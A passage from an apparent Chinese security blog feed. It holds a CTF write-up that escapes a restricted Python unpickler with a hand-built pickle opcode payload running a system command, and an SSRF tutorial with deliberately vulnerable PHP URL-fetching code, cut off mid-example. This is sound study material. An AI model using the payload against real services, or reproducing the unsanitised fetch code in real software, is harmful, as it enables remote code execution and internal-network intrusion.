class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3 -u</span><br><br><span class="hljs-keyword">import</span> securePickle <span class="hljs-keyword">as</span> pickle<br><span class="hljs-keyword">import</span> codecs<br><br><br>pickle.whitelist.append(<span class="hljs-string">&#x27;sys&#x27;</span>)<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Pysh</span>(<span class="hljs-params"><span class="hljs-built_in">object</span></span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self</span>):</span><br>        self.login()<br>        self.cmds = &#123;&#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">login</span>(<span class="hljs-params">self</span>):</span><br>        user = <span class="hljs-built_in">input</span>().encode(<span class="hljs-string">&#x27;ascii&#x27;</span>)<br>        user = codecs.decode(user, <span class="hljs-string">&#x27;base64&#x27;</span>)<br>        user = pickle.loads(user)<br>        <span class="hljs-keyword">raise</span> NotImplementedError(<span class="hljs-string">&quot;Not Implemented QAQ&quot;</span>)<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            req = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;$ &#x27;</span>)<br>            func = self.cmds.get(req, <span class="hljs-literal">None</span>)<br>            <span class="hljs-keyword">if</span> func <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;pysh: &#x27;</span> + req + <span class="hljs-string">&#x27;: command not found&#x27;</span>)<br>            <span class="hljs-keyword">else</span>:<br>                func()<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    pysh = Pysh()<br>    pysh.run()<br></code></pre></td></tr></table></figure><p>find_class 直接调的 pickle.py 中的方法，那就先看看它如何导入包的：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># pickle.Unpickler.find_class</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">find_class</span>(<span class="hljs-params">self, module, name</span>):</span><br>    <span class="hljs-comment"># Subclasses may override this.</span><br>    <span class="hljs-keyword">if</span> self.proto &lt; <span class="hljs-number">3</span> <span class="hljs-keyword">and</span> self.fix_imports:<br>        <span class="hljs-keyword">if</span> (module, name) <span class="hljs-keyword">in</span> _compat_pickle.NAME_MAPPING:<br>            module, name = _compat_pickle.NAME_MAPPING[(module, name)]<br>        <span class="hljs-keyword">elif</span> module <span class="hljs-keyword">in</span> _compat_pickle.IMPORT_MAPPING:<br>            module = _compat_pickle.IMPORT_MAPPING[module]<br>    <span class="hljs-built_in">__import__</span>(module, level=<span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">if</span> self.proto &gt;= <span class="hljs-number">4</span>:<br>        <span class="hljs-keyword">return</span> _getattribute(sys.modules[module], name)[<span class="hljs-number">0</span>]<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">getattr</span>(sys.modules[module], name)<br></code></pre></td></tr></table></figure><p>题目用<code>RestrictedUnpickler</code>做为反序列化的过程类，<code>find_class</code>中限制了反序列化的对象必须是<code>sys</code>模块中的对象。也就是我们要保证我们使用<code>c</code>导入的模块只能是<code>sys</code>。</p><p>但是<code>sys</code>模块具有一个属性<a href="https://docs.python.org/3/library/sys.html#sys.modules"><code>modules</code></a>，其中包含所有已加载的模块，并且还允许覆盖这些模块。但是<code>pickle</code>没有提供<code>GETITEM</code>说明，我们只能访问的直接属性<code>sys</code>，因此不能<code>sys.modules.__getitem__</code>直接调用。限制了<code>module</code>只能为<code>sys</code>，那能否把<code>sys.modules[‘sys’]</code>替换为<code>sys.modules[‘os’]</code>，从而引入危险模块。但是我们可以：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> sys <span class="hljs-keyword">import</span> modules<br>modules[<span class="hljs-string">&#x27;sys&#x27;</span>] = modules[<span class="hljs-string">&#x27;os&#x27;</span>]<br><span class="hljs-keyword">from</span> sys <span class="hljs-keyword">import</span> system<br></code></pre></td></tr></table></figure><p>本地实验：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python">C:\Users\<span class="hljs-number">50871</span>&gt;python3<br>Python <span class="hljs-number">3.9</span><span class="hljs-number">.0</span> (tags/v3<span class="hljs-number">.9</span><span class="hljs-number">.0</span>:9cf6752, Oct  <span class="hljs-number">5</span> <span class="hljs-number">2020</span>, <span class="hljs-number">15</span>:<span class="hljs-number">34</span>:<span class="hljs-number">40</span>) [MSC v<span class="hljs-number">.1927</span> <span class="hljs-number">64</span> bit (AMD64)] on win32<br><span class="hljs-type">Type</span> <span class="hljs-string">&quot;help&quot;</span>, <span class="hljs-string">&quot;copyright&quot;</span>, <span class="hljs-string">&quot;credits&quot;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;license&quot;</span> <span class="hljs-keyword">for</span> more information.<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">from</span> sys <span class="hljs-keyword">import</span> modules<br><span class="hljs-meta">&gt;&gt;&gt; </span>modules[<span class="hljs-string">&#x27;sys&#x27;</span>] = modules[<span class="hljs-string">&#x27;os&#x27;</span>]<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">from</span> sys <span class="hljs-keyword">import</span> system<br><span class="hljs-meta">&gt;&gt;&gt; </span>system(<span class="hljs-string">&#x27;dir&#x27;</span>)<br> 驱动器 C 中的卷是 Windows-SSD<br> 卷的序列号是 EE9A-<span class="hljs-number">6908</span><br><br> C:\Users\<span class="hljs-number">50871</span> 的目录<br><br><span class="hljs-number">2021</span>/04/<span class="hljs-number">20</span>  <span class="hljs-number">23</span>:<span class="hljs-number">00</span>    &lt;DIR&gt;          .<br><span class="hljs-number">2021</span>/04/<span class="hljs-number">20</span>  <span class="hljs-number">23</span>:<span class="hljs-number">00</span>    &lt;DIR&gt;          ..<br><span class="hljs-number">2020</span>/09/<span class="hljs-number">21</span>  <span class="hljs-number">23</span>:<span class="hljs-number">20</span>    &lt;DIR&gt;          .android<br><span class="hljs-number">2021</span>/04/08  <span class="hljs-number">20</span>:08             <span class="hljs-number">1</span>,<span class="hljs-number">411</span> .bash_history<br></code></pre></td></tr></table></figure><p>因为<code>modules</code>是个<code>dict</code>，所以我们需要用<code>getattr(sys.modules[module], name)</code>获取字典其中一个的值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> sys<br><span class="hljs-meta">&gt;&gt;&gt; </span>sys.modules[<span class="hljs-string">&#x27;sys&#x27;</span>] = sys.modules<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> sys<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">dir</span>(sys)  <span class="hljs-comment"># 成功导入 dict 对象</span><br>[<span class="hljs-string">&#x27;__class__&#x27;</span>, <span class="hljs-string">&#x27;__contains__&#x27;</span>, <span class="hljs-string">&#x27;__delattr__&#x27;</span>, <span class="hljs-string">&#x27;__delitem__&#x27;</span>, <span class="hljs-string">&#x27;__dir__&#x27;</span>, <span class="hljs-string">&#x27;__doc__&#x27;</span>, <span class="hljs-string">&#x27;__eq__&#x27;</span>, <span class="hljs-string">&#x27;__format__&#x27;</span>, <span class="hljs-string">&#x27;__ge__&#x27;</span>, <span class="hljs-string">&#x27;__getattribute__&#x27;</span>, <span class="hljs-string">&#x27;__getitem__&#x27;</span>, <span class="hljs-string">&#x27;__gt__&#x27;</span>, <span class="hljs-string">&#x27;__hash__&#x27;</span>, <span class="hljs-string">&#x27;__init__&#x27;</span>, <span class="hljs-string">&#x27;__init_subclass__&#x27;</span>, <span class="hljs-string">&#x27;__iter__&#x27;</span>, <span class="hljs-string">&#x27;__le__&#x27;</span>, <span class="hljs-string">&#x27;__len__&#x27;</span>, <span class="hljs-string">&#x27;__lt__&#x27;</span>, <span class="hljs-string">&#x27;__ne__&#x27;</span>, <span class="hljs-string">&#x27;__new__&#x27;</span>, <span class="hljs-string">&#x27;__reduce__&#x27;</span>, <span class="hljs-string">&#x27;__reduce_ex__&#x27;</span>, <span class="hljs-string">&#x27;__repr__&#x27;</span>, <span class="hljs-string">&#x27;__setattr__&#x27;</span>, <span class="hljs-string">&#x27;__setitem__&#x27;</span>, <span class="hljs-string">&#x27;__sizeof__&#x27;</span>, <span class="hljs-string">&#x27;__str__&#x27;</span>, <span class="hljs-string">&#x27;__subclasshook__&#x27;</span>, <span class="hljs-string">&#x27;clear&#x27;</span>, <span class="hljs-string">&#x27;copy&#x27;</span>, <span class="hljs-string">&#x27;fromkeys&#x27;</span>, <span class="hljs-string">&#x27;get&#x27;</span>, <span class="hljs-string">&#x27;items&#x27;</span>, <span class="hljs-string">&#x27;keys&#x27;</span>, <span class="hljs-string">&#x27;pop&#x27;</span>, <span class="hljs-string">&#x27;popitem&#x27;</span>, <span class="hljs-string">&#x27;setdefault&#x27;</span>, <span class="hljs-string">&#x27;update&#x27;</span>, <span class="hljs-string">&#x27;values&#x27;</span>]<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">getattr</span>(sys, <span class="hljs-string">&#x27;get&#x27;</span>)  <span class="hljs-comment"># 结合 find_class 中的 getattr</span><br>&lt;built-<span class="hljs-keyword">in</span> method get of <span class="hljs-built_in">dict</span> <span class="hljs-built_in">object</span> at <span class="hljs-number">0x000002622D052688</span>&gt;<br></code></pre></td></tr></table></figure><p>利用<code>get</code>即可执行命令</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> sys<br><span class="hljs-meta">&gt;&gt;&gt; </span>sys.modules.get(<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;dir&#x27;</span>)<br> 驱动器 C 中的卷是 Windows-SSD<br> 卷的序列号是 EE9A-<span class="hljs-number">6908</span><br><br> C:\Users\<span class="hljs-number">50871</span> 的目录<br><br><span class="hljs-number">2021</span>/04/<span class="hljs-number">20</span>  <span class="hljs-number">23</span>:<span class="hljs-number">00</span>    &lt;DIR&gt;          .<br><span class="hljs-number">2021</span>/04/<span class="hljs-number">20</span>  <span class="hljs-number">23</span>:<span class="hljs-number">00</span>    &lt;DIR&gt;          ..<br><span class="hljs-number">2020</span>/09/<span class="hljs-number">21</span>  <span class="hljs-number">23</span>:<span class="hljs-number">20</span>    &lt;DIR&gt;          .android<br><span class="hljs-number">2021</span>/04/08  <span class="hljs-number">20</span>:08             <span class="hljs-number">1</span>,<span class="hljs-number">411</span> .bash_history<br></code></pre></td></tr></table></figure><p>所以我们需要构造：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">sys.modules[<span class="hljs-string">&#x27;sys&#x27;</span>] = sys.modules<br>sys.modules[<span class="hljs-string">&#x27;sys&#x27;</span>].get(<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;dir&#x27;</span>)<br></code></pre></td></tr></table></figure><p>改为opcode：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">csys<br>modules<br>p100<br>S<span class="hljs-string">&#x27;sys&#x27;</span><br>g100<br>scsys<br>get<br>(S<span class="hljs-string">&#x27;os&#x27;</span><br>tRp101<br>0S<span class="hljs-string">&#x27;sys&#x27;</span><br>g101<br>scsys<br>system<br>(S<span class="hljs-string">&#x27;dir&#x27;</span><br>tR.<br></code></pre></td></tr></table></figure><p>分析如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"> <span class="hljs-number">0</span>: c    GLOBAL     <span class="hljs-string">&#x27;sys modules&#x27;</span>   <span class="hljs-comment">#引入对象sys.modules</span><br><span class="hljs-number">13</span>: p    PUT        <span class="hljs-number">100</span>   <span class="hljs-comment">#将栈顶对象储存至memo_100</span><br><span class="hljs-number">18</span>: S    STRING     <span class="hljs-string">&#x27;sys&#x27;</span>   <span class="hljs-comment">#实例化一个字符串对象sys</span><br><span class="hljs-number">25</span>: g    GET        <span class="hljs-number">100</span>   <span class="hljs-comment">#将memo_100的对象压栈</span><br><span class="hljs-number">30</span>: s    SETITEM   <span class="hljs-comment">#将栈的第一个和第二个对象作为key-value对，添加或更新到栈的第三个对象,即获得sys.modules[&#x27;sys&#x27;]</span><br><span class="hljs-number">31</span>: c    GLOBAL     <span class="hljs-string">&#x27;sys get&#x27;</span>   <span class="hljs-comment">#引入对象sys.get</span><br><span class="hljs-number">40</span>: (    MARK   <span class="hljs-comment">#向栈中压入一个MARK标记</span><br><span class="hljs-number">41</span>: S        STRING     <span class="hljs-string">&#x27;os&#x27;</span>   <span class="hljs-comment">#实例化一个字符串对象os</span><br><span class="hljs-number">47</span>: t        TUPLE      (MARK at <span class="hljs-number">40</span>)   <span class="hljs-comment">#寻找栈中的上一个MARK，并组合之间的数据为元组,即(&#x27;os&#x27;)</span><br><span class="hljs-number">48</span>: R    REDUCE   <span class="hljs-comment">#选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数,即获得sys.get(&#x27;os&#x27;)</span><br><span class="hljs-number">49</span>: p    PUT        <span class="hljs-number">101</span>   <span class="hljs-comment">#将栈顶对象储存至memo_101</span><br><span class="hljs-number">54</span>: <span class="hljs-number">0</span>    POP   <span class="hljs-comment">#丢弃栈顶对象</span><br><span class="hljs-number">55</span>: S    STRING     <span class="hljs-string">&#x27;sys&#x27;</span>   <span class="hljs-comment">#实例化一个字符串对象sys</span><br><span class="hljs-number">62</span>: g    GET        <span class="hljs-number">101</span>   <span class="hljs-comment">#将memo_101的对象压栈</span><br><span class="hljs-number">67</span>: s    SETITEM   <span class="hljs-comment">#将栈的第一个和第二个对象作为key-value对，添加或更新到栈的第三个对象,即获得</span><br><span class="hljs-number">68</span>: c    GLOBAL     <span class="hljs-string">&#x27;sys system&#x27;</span>   <span class="hljs-comment">#引入对象sys.system</span><br><span class="hljs-number">80</span>: (    MARK   <span class="hljs-comment">#向栈中压入一个MARK标记</span><br><span class="hljs-number">81</span>: S        STRING     <span class="hljs-string">&#x27;dir&#x27;</span>   <span class="hljs-comment">#实例化一个字符串对象dir</span><br><span class="hljs-number">88</span>: t        TUPLE      (MARK at <span class="hljs-number">80</span>)   <span class="hljs-comment">#寻找栈中的上一个MARK，并组合之间的数据为元组,即(&#x27;dir&#x27;)</span><br><span class="hljs-number">89</span>: R    REDUCE   <span class="hljs-comment">#选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数</span><br><span class="hljs-number">90</span>: .    STOP   <span class="hljs-comment">#结束</span><br></code></pre></td></tr></table></figure><h3 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h3><p><a href="https://xz.aliyun.com/t/7436#toc-6">https://xz.aliyun.com/t/7436#toc-6</a></p><p><a href="https://www.anquanke.com/post/id/188981#h3-9">https://www.anquanke.com/post/id/188981#h3-9</a></p><p><a href="https://whoamianony.top/2021/02/09/Web%E5%AE%89%E5%85%A8/CTF-Web%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84Python%E9%A2%98%E5%9E%8B%E4%B8%8E%E8%A7%A3%E9%A2%98%E5%A7%BF%E5%8A%BF/">https://whoamianony.top/2021/02/09/Web%E5%AE%89%E5%85%A8/CTF-Web%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84Python%E9%A2%98%E5%9E%8B%E4%B8%8E%E8%A7%A3%E9%A2%98%E5%A7%BF%E5%8A%BF/</a></p><p><a href="https://xz.aliyun.com/t/7436">https://xz.aliyun.com/t/7436</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>web安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SSRF漏洞</title>
    <link href="/2021/04/19/SSRF%E6%BC%8F%E6%B4%9E/"/>
    <url>/2021/04/19/SSRF%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="SSRF漏洞"><a href="#SSRF漏洞" class="headerlink" title="SSRF漏洞"></a>SSRF漏洞</h1><p>学习来源：</p><p><code>https://whoamianony.top/2021/01/16/Web%E5%AE%89%E5%85%A8/CTF%20SSRF%20%E6%BC%8F%E6%B4%9E%E4%BB%8E0%E5%88%B01/</code></p><h3 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h3><p>SSRF（Server-Side Request Forgery:服务器端请求伪造）是一种由攻击者构造形成并由服务端发起恶意请求的一个安全漏洞。正是因为恶意请求由服务端发起，而服务端能够请求到与自身相连而与外网隔绝的内部网络系统，所以一般情况下，SSRF的攻击目标是攻击者无法直接访问的内网系统。</p><p>容易出现SSRF的地方：</p><ol><li>社交分享功能：获取超链接的标题等内容进行显示</li><li>转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</li><li>在线翻译：给网址翻译对应网页的内容</li><li>图片加载/下载：例如富文本编辑器中的点击下载图片到本地、通过URL地址加载或下载图片</li><li>图片/文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用具体验</li><li>云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试</li><li>网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作</li><li>数据库内置功能：数据库的比如mongodb的copyDatabase函数</li><li>邮件系统：比如接收邮件服务器地址</li><li>编码处理、属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等</li><li>未公开的api实现以及其他扩展调用URL的功能：可以利用google语法加上这些关键字去寻找SSRF漏洞。一些的url中的关键字有：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……</li><li>从远程服务器请求资源</li></ol><p>SSRF漏洞的危害：</p><blockquote><ol><li>对外网、服务器所在内网、服务器本地进行端口扫描，获取一些服务的banner信息等。</li><li>攻击运行在内网或服务器本地的其他应用程序，如redis、mysql等。</li><li>对内网Web应用进行指纹识别，识别企业内部的资产信息。</li><li>攻击内外网的Web应用，主要是使用HTTP GET/POST请求就可以实现的攻击，如sql注入、文件上传等。</li><li>利用file协议读取服务器本地文件等。</li><li>进行跳板攻击等。</li></ol></blockquote><h3 id="SSRF漏洞相关函数和类"><a href="#SSRF漏洞相关函数和类" class="headerlink" title="SSRF漏洞相关函数和类"></a>SSRF漏洞相关函数和类</h3><ul><li>file_get_contents()：将整个文件或一个url所指向的文件读入一个字符串中。</li><li>readfile()：输出一个文件的内容。</li><li>fsockopen()：打开一个网络连接或者一个Unix 套接字连接。</li><li>curl_exec()：初始化一个新的会话，返回一个cURL句柄，供curl_setopt()，curl_exec()和curl_close() 函数使用。</li><li>fopen()：打开一个文件文件或者 URL。</li><li>……</li></ul><p>上述函数函数使用不当会造成SSRF漏洞。 此外，PHP原生类SoapClient在触发反序列化时可导致SSRF。</p><h4 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents()"></a>file_get_contents()</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// ssrf.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$url</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>];;<br><span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-variable">$url</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/wzimg/79.png" alt="image-20210415160648156"></p><p>也可以进行远程访问：</p><p><img src="/wzimg/77.png" alt="a"></p><p><code>readfile()</code>函数与<code>file_get_contents()</code>函数相似。</p><h4 id="fsockopen"><a href="#fsockopen" class="headerlink" title="fsockopen()"></a>fsockopen()</h4><p><code>fsockopen($hostname,$port,$errno,$errstr,$timeout)</code> 用于打开一个网络连接或者一个<code>Unix</code>套接字连接，初始化一个套接字连接到指定主机（hostname），实现对用户指定url数据的获取。该函数会使用<code>socket</code>跟服务器建立<code>tcp</code>连接，进行传输原始数据。<br><code>fsockopen()</code>将返回一个文件句柄，之后可以被其他文件类函数调用（例如：fgets()，fgetss()，fwrite()，fclose()还有feof()）。如果调用失败，将返回false。</p><p>测试代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php">PHP<br><span class="hljs-comment">// ssrf.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$host</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$fp</span> = fsockopen(<span class="hljs-variable">$host</span>, <span class="hljs-number">80</span>, <span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span>, <span class="hljs-number">30</span>);<br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$fp</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$errstr</span> (<span class="hljs-subst">$errno</span>)&lt;br /&gt;\n&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$out</span> = <span class="hljs-string">&quot;GET / HTTP/1.1\r\n&quot;</span>;<br>    <span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;Host: <span class="hljs-subst">$host</span>\r\n&quot;</span>;<br>    <span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;Connection: Close\r\n\r\n&quot;</span>;<br>    fwrite(<span class="hljs-variable">$fp</span>, <span class="hljs-variable">$out</span>);<br>    <span class="hljs-keyword">while</span> (!feof(<span class="hljs-variable">$fp</span>)) &#123;<br>        <span class="hljs-keyword">echo</span> fgets(<span class="hljs-variable">$fp</span>, <span class="hljs-number">128</span>);<br>    &#125;<br>    fclose(<span class="hljs-variable">$fp</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/wzimg/78.png" alt="a"></p><p>但是该函数的SSRF无法读取本地文件。</p><h4 id="curl-exec"><a href="#curl-exec" class="headerlink" title="curl_exec()"></a>curl_exec()</h4><p><code>curl_init(url)</code>函数初始化一个新的会话，返回一个<code>cURL</code>句柄，供<code>curl_setopt()</code>，<code>curl_exec()</code>和<code>curl_close() </code>函数使用。</p><p>测试代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php">PHP<br><span class="hljs-comment">// ssrf.php</span><br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]))&#123;<br><span class="hljs-variable">$link</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$curlobj</span> = curl_init(); <span class="hljs-comment">// 创建新的 cURL 资源</span><br>curl_setopt(<span class="hljs-variable">$curlobj</span>, CURLOPT_POST, <span class="hljs-number">0</span>);<br>curl_setopt(<span class="hljs-variable">$curlobj</span>,CURLOPT_URL,<span class="hljs-variable">$link</span>);<br>curl_setopt(<span class="hljs-variable">$curlobj</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>); <span class="hljs-comment">// 设置 URL 和相应的选项</span><br><span class="hljs-variable">$result</span>=curl_exec(<span class="hljs-variable">$curlobj</span>); <span class="hljs-comment">// 抓取 URL 并把它传递给浏览器</span><br>curl_close(<span class="hljs-variable">$curlobj</span>); <span class="hljs-comment">// 关闭 cURL 资源，并且释放系统资源</span><br> <br><span class="hljs-comment">// $filename = &#x27;./curled/&#x27;.rand().&#x27;.txt&#x27;;</span><br><span class="hljs-comment">// file_put_contents($filename, $result); </span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/wzimg/77.png" alt="a"></p><p>也可以使用file协议读取本地文件</p><h4 id="SoapClient"><a href="#SoapClient" class="headerlink" title="SoapClient"></a>SoapClient</h4><p>SOAP是简单对象访问协议，简单对象访问协议（SOAP）是一种轻量的、简单的、基于 XML 的协议，它被设计成在 WEB 上交换结构化的和固化的信息。PHP 的 SoapClient 就是可以基于SOAP协议可专门用来访问 WEB 服务的 PHP 客户端。</p><p>SoapClient是一个php的内置类，当其进行反序列化时，如果触发了该类中的 <code>__call</code> 方法，那么 <code>__call</code> 便方法可以发送HTTP和HTTPS请求。该类的构造函数如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> SoapClient :: SoapClient(<span class="hljs-keyword">mixed</span> <span class="hljs-variable">$wsdl</span> [，<span class="hljs-keyword">array</span> <span class="hljs-variable">$options</span> ])<br></code></pre></td></tr></table></figure><ul><li>第一个参数是用来指明是否是<code>wsdl</code>模式。</li><li>第二个参数为一个数组，如果在<code>wsdl</code>模式下，此参数可选；如果在非<code>wsdl</code>模式下，则必须设置<code>location</code>和<code>uri</code>选项，其中<code>location</code>是要将请求发送到的SOAP服务器的URL，而<code>uri</code>是SOAP服务的目标命名空间。</li></ul><p>我们可以设置第一个参数为<code>null</code>，然后第二个参数为一个包含<code>location</code>和<code>uri</code>的数组，<code>location</code>选项的值设置为<code>target_url</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// ssrf.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> SoapClient(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;uri&#x27;</span>=&gt;<span class="hljs-string">&#x27;http://47.xxx.xxx.72:2333&#x27;</span>, <span class="hljs-string">&#x27;location&#x27;</span>=&gt;<span 